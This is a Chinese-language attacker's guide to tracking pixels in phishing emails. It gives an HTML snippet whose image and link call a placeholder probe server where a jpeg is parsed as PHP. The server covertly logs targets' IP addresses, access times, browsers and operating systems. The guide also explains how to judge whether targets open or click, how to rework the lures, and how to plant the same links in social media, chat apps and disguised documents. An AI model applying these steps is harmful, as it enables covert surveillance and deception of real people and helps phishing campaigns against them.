图片探针技术
     技术人员可以根据图片预览探针信息判断目标对象是否点击了攻击邮件标题，如果一直没有图片预览探针信息产生，表明目标对象不活跃，如果短时间无人点击，表明编写的策略邮件标题没有吸引力，需要编写更吸引眼球的邮件标题；如果攻击多次也没有产生图片探针信息就表明目标对象邮箱为废弃邮箱，需要及时更换目标对象邮箱网情。具体方法如下：
   向目标对象邮箱发送HTML邮件：
<a href="http://XXX.XXX.XXX.XXX/check.php?1" ><img src="http://XXX.XXX.XXX.XXX/photo.jpeg?1"></a>
XXX.XXX.XXX.XXX为指探针服务器的域名地址。
    URL中?号后面的数字为目标对象标识，用来区分每批次不同的目标对象，可任意定制。
    Img部分为图片预览探针，里面指向的photo.jpeg不是单纯的图片，而是一个php页面，只是在目标VPS服务器上做了特定解析，将jpeg解析为php，photo.jpeg的功能是记录目标终端的访问信息，例如目标对象IP地址、访问时间、浏览器类型、操作系统类型等信息，然后将一个真正的jpg图片呈现在目标对象邮件里，目标对象根本无法发现任何异常。获取的目标对象IP地址是否精确取决于目标对象所用上网终端类型，如果使用IPhone、IPad或MacOS等Apple系列产品，则能够准确记录目标对象的IP地址，如果使用Android系统来查看的话，可以获取侦察对象当前所在城市的IP地址。
     Href部分为图片链接探针，当目标对象点击邮件中的图片时，会在后台VPS服务器上记录目标对象IP地址、访问时间、浏览器类型、操作系统类型等信息，其中IP地址为精确地址信息。当记录到点击图片链接的探针信息时，表明目标对象对邮件内容比较感兴趣，否则就需要外语人员继续调整邮件欺骗策略。此漏洞在实际使用中其实完全不必限于Gmail邮箱，只要诱使目标对象打开该链接打开即可，例如在Facebook、聊天软件、伪装文档里的链接，目标对象所用的上网终端可以为手机、平板、电脑等各种上网终端。
    一、目标对象点击邮件标题后，就会自动预览图片，然后在后台VPS的/var/www /html/jpg目录下产生一个view.gif文件，该文件记录预览图片的目标对象终端信息。该方式记录的IP在IPhone、IPAD、MACOS下为准确IP，在Android产品下为所在城市的IP。
    二、目标对象点击图片后，会在在后台VPS的/var/www/html/jpg目录下产生一个click.gif文件，该文件记录点击图片的目标对象终端信息。记录的IP地址是精准IP。